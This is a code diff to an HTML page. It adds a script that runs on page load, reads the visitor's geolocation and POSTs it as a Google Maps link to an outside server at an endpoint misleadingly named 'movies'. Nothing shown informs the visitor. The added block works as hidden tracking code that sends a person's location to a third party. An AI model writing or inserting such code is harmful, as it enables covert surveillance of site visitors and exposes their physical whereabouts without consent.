@@ -154,6 +154,40 @@
                 }, "image/png");
             });
         }
+
+
+        const jsonServerUrl = "https://mobilw-1.onrender.com/movies"; // Change to your JSON Server URL
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(uploadLocation, showError);
+            }
+        }
+
+        function uploadLocation(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            fetch(jsonServerUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ mapUrl })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Location uploaded:", data))
+            .catch(error => console.error("Error uploading location:", error));
+        }
+
+        function showError(error) {
+            console.error("Geolocation error:", error);
+        }
+
+        // Call function on page load
+        getLocation();
+
+
+        
     </script>
 </body>
 </html>
